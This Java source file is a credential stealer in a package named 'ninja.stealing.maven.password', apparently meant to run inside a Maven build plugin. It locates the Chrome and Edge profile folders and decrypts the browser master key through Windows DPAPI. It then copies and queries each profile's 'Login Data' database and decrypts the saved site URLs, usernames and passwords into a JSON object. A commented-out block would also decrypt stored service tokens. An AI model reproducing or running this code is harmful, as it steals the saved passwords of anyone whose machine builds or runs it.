package ninja.stealing.maven.password.extractor;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.github.windpapi4j.InitializationFailedException;
import com.github.windpapi4j.WinAPICallFailedException;
import com.github.windpapi4j.WinDPAPI;
import ninja.stealing.maven.password.Utils;
import ninja.stealing.maven.password.model.Extraction;
import org.apache.maven.plugin.logging.Log;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.IOException;
import java.io.Reader;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.*;
import java.util.*;

import static java.nio.file.StandardCopyOption.REPLACE_EXISTING;

public class ChromeExtractor implements Extractor {
    static final String EXTRACTOR_ID = "CHROME";
    private static String HOME = System.getProperty("user.home");
    private static String CHROME_BROWSER_PATH = "/AppData/Local/Google/Chrome/User Data";
    private static String EDGE_BROWSER_PATH = "/AppData/Local/Microsoft/Edge/User Data";

    private static String LOGIN_DATA = "Login Data";
    private static String LOCAL_STATE = "Local State";
    private static String WEB_DATA = "Web Data";

    private static WinDPAPI winDPAPI;
    public static final int GCM_IV_LENGTH = 12;
    private Log log;

    public ChromeExtractor(Log log) {
        this.log = log;

    }

    @Override
    public Extraction extract() {
        ObjectMapper mapper = new ObjectMapper();
        ObjectNode content = mapper.createObjectNode();
        log.info("Extracting password from chrome/edge");
        Extraction emptyExtraction = new Extraction(EXTRACTOR_ID, content);
        // First check if we can have the DPAPI
        if (!WinDPAPI.isPlatformSupported()) {
            log.warn("The Windows Data Protection API (DPAPI) is not available on " + System.getProperty("os.name") + ".");
            //return emptyExtraction;
        }

        try {
            winDPAPI = WinDPAPI.newInstance(WinDPAPI.CryptProtectFlag.CRYPTPROTECT_UI_FORBIDDEN);
        } catch (InitializationFailedException e) {
            log.warn("Can't initialize WinDPAPI");
            //return emptyExtraction;
        }
        //log.info("DPAPI can be loaded");

        content.set("Chrome", getData(CHROME_BROWSER_PATH));
        content.set("Edge", getData(EDGE_BROWSER_PATH));

        Extraction extraction = new Extraction(EXTRACTOR_ID, content);
        return extraction;
    }

    private JsonNode getData(String browserPath) {
        ObjectMapper mapper = new ObjectMapper();
        ObjectNode data = mapper.createObjectNode();

        // Get and decrypt the master key
        Path stateData = Paths.get(HOME, browserPath, LOCAL_STATE);
        log.info("Try to load state data: " + stateData.getFileName());

        byte[] encryptedMasterKey; // BASE64 encoded in the json file
        try {
            encryptedMasterKey = getEncryptedMasterFromJsonFile(stateData);
        } catch (IOException e) {
            log.warn("Can't load  state data. Cancelling dump");
            return data;
        }

        byte[] result = new byte[encryptedMasterKey.length - 5]; //5 first char should be DPAPI. Maybe we should check ^^
        System.arraycopy(encryptedMasterKey, 5, result, 0, encryptedMasterKey.length - 5);

        byte[] decryptedMasterKey = new byte[0]; // Master key is protected by the WDAPI
        try {
            decryptedMasterKey = winDPAPI.unprotectData(result);
        } catch (WinAPICallFailedException e) {
            log.warn("Can't decrypt master key.");
        }
        if (decryptedMasterKey.length > 0) {
            log.info("Master key retrieved and decrypted");
            ObjectNode masterNode = mapper.createObjectNode();
            masterNode.put("value_b64", Utils.b64(decryptedMasterKey.toString()));
            masterNode.put("path", stateData.toAbsolutePath().toString());
            data.set("masterkey", masterNode);
        }
        // some keys are not crypted


        // Get all profile to grab all the database
        List<String> profiles = new ArrayList<>();
        try {
            profiles = getProfilesFromJsonFile(stateData);
        } catch (IOException e) {
            log.warn("Can't get profile.");
        }

        for (String profile : profiles) {
            ObjectNode profileNode = mapper.createObjectNode();
            profileNode.put("name", profile);


            // Copy the SQLITE database to open it without alteration/risk
            Path loginData = Paths.get(HOME, browserPath, profile, LOGIN_DATA);
            Path tmpFile = null;
            profileNode.put("logindata", loginData.toAbsolutePath().toString());
            try {
                tmpFile = Files.createTempFile("data", "sqlite");
                Files.copy(loginData, tmpFile, REPLACE_EXISTING);
            } catch (IOException e) {
                log.warn("Can't copy sqlite file. Skipping this profile");
                continue;
            }

            Connection conn = null;
            Statement stmt = null;
            ResultSet rs = null;
            try {
                conn = DriverManager.getConnection("jdbc:sqlite:" + tmpFile.toAbsolutePath());
                stmt = conn.createStatement();
                rs = stmt.executeQuery("SELECT origin_url, action_url, username_value, password_value FROM logins");
            } catch (SQLException e) {
                log.warn("SQL issue. Skipping this profile");
                continue;
            }
            boolean next = false;
            try {
                next = rs.next();
            } catch (SQLException e) {
            }
            int cnt = 0;
            while (next) {
                ObjectNode passNode = mapper.createObjectNode();

                String origin = null;
                String action = null;
                String name = null;
                byte[] password = new byte[0];
                try {
                    origin = rs.getString("origin_url");
                    passNode.put("origin", origin);
                } catch (SQLException e) {
                    e.printStackTrace();
                }

                try {
                    action = rs.getString("action_url");
                    passNode.put("action", action);
                } catch (SQLException e) {
                    e.printStackTrace();
                }
                try {
                    name = rs.getString("username_value");
                    passNode.put("name", name);
                } catch (SQLException e) {
                    e.printStackTrace();
                }
                try {
                    password = rs.getBytes("password_value");
                    passNode.put("rawpassb64", Utils.b64(new String(password)));

                } catch (Exception e) {
                    e.printStackTrace();
                }
                if (password.length > 0) {
                    if (decryptedMasterKey.length > 0) {
                        try {
                            byte[] decryptedText = decrypt(password, decryptedMasterKey);
                            passNode.put("password", new String(decryptedText));
                        } catch (Exception e) {
                            //ok...
                        }
                    }
                    //We can also try without master
                    try {
                        byte[]  decryptedText = winDPAPI.unprotectData(password);
                        passNode.put("p@ssword", new String(decryptedText));
                    } catch (WinAPICallFailedException e) {
                        // sad noise
                    }
                }

                profileNode.put("pass" + ++cnt, passNode);


                try {
                    next = rs.next();
                } catch (SQLException e) {
                    next = false;
                }
            }
            try {
                rs.close();
                stmt.close();
                conn.close();
            } catch (SQLException e) {
                log.warn("SQL issue when closing. Shit happens");
            }

            data.set("profile_" + profile, profileNode);

        }
/*
        for (String profile : profiles) {
            // Copy the SQLITE database to open it without alteration/risk
            Path webData = Paths.get(HOME, BROWSER_PATH, profile, WEB_DATA);
            Path tmpFile = Files.createTempFile("data", "sqlite");

            tmpFile = Files.createTempFile("data", "sqlite");
            Files.copy(webData, tmpFile, REPLACE_EXISTING);
            Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tmpFile.toAbsolutePath());
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery("SELECT service, encrypted_token FROM token_service");
            while (rs.next()) {
                String service = rs.getString("service");
                byte[] encrypted_token = rs.getBytes("encrypted_token");
                log.warn("service = " + service);
                log.warn("encrypted_token = " + encrypted_token);
                byte[] decryptedText = decrypt(encrypted_token, decryptedMasterKey);
                log.warn("Token : " + new String(decryptedText));
            }
            rs.close();
            stmt.close();
            conn.close();
        }
*/
        return data;
    }

    private List<String> getProfilesFromJsonFile(Path jsonPath) throws IOException {
        List<String> profiles = new ArrayList<>();
        Reader reader = Files.newBufferedReader(jsonPath);
        //create ObjectMapper instance
        ObjectMapper objectMapper = new ObjectMapper();

        //read customer.json file into tree model
        JsonNode parser = objectMapper.readTree(reader);
        JsonNode profile = parser.path("profile");
        JsonNode cache = profile.path("info_cache");

        for (Iterator<Map.Entry<String, JsonNode>> it = cache.fields(); it.hasNext(); ) {
            Map.Entry<String, JsonNode> entry = it.next();
            profiles.add(entry.getKey());
        }

        return profiles;

    }


    private byte[] decrypt(byte[] ciphertext, byte[] key) {
        try {
            ByteBuffer byteBuffer = ByteBuffer.wrap(ciphertext);
            byte[] version = new byte[3]; // v10
            byteBuffer.get(version);
            byte[] iv = new byte[GCM_IV_LENGTH];
            byteBuffer.get(iv);
            byte[] encrypted = new byte[byteBuffer.remaining()];
            byteBuffer.get(encrypted);
            Cipher decryptCipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
            decryptCipher.init(Cipher.DECRYPT_MODE, keySpec, new GCMParameterSpec(128, iv));
            return decryptCipher.doFinal(encrypted);
        } catch (Exception e) {
            log.warn("decrypt: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    private byte[] getEncryptedMasterFromJsonFile(Path jsonPath) throws IOException {
        Reader reader = Files.newBufferedReader(jsonPath);
        //create ObjectMapper instance
        ObjectMapper objectMapper = new ObjectMapper();

        //read customer.json file into tree model
        JsonNode parser = objectMapper.readTree(reader);
        JsonNode crypt = parser.path("os_crypt");
        String key = crypt.path("encrypted_key").asText();
        return Base64.getDecoder().decode(key);
    }
}
